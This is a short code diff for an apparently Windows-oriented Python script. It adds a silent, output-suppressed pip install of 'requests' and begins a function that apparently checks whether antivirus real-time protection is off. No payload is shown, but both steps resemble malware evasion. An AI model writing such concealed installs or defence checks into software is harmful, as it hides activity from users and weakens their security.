@@ -1,8 +1,22 @@
 import os
 import subprocess
+import sys
 import time
 import json
-import requests
+
+# Auto-silent install of required modules
+def install_requirements():
+    try:
+        import requests
+    except ImportError:
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "requests"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+install_requirements()
+import requests  # Now safe to import
 
 def is_realtime_protection_off():
     si = subprocess.STARTUPINFO()
